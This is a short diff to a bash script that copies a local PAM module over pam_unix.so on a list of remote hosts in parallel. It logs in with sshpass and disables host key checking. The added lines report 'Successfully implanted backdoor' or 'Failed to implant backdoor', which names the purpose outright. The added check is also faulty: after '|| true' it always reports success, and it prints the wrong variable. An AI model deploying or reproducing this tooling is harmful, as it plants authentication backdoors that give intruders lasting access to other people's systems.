@@ -27,6 +27,12 @@ main() {
     printf "%s\n" "${IPs[@]}" | xargs -P 20 -n1 -I {} bash -c '
         IP="{}"
         sshpass -p "$password" scp -o StrictHostKeyChecking=no -o ConnectTimeout=$timeout "$local_pam_file" "$username@$IP:$path_to_pam/pam_unix.so" || true
+
+        if [ $? -eq 0 ]; then
+            echo "Successfully implanted backdoor at $local_ip"
+        else
+            echo "Failed to implant backdoor at $local_ip"
+        fi
     '
 }
 
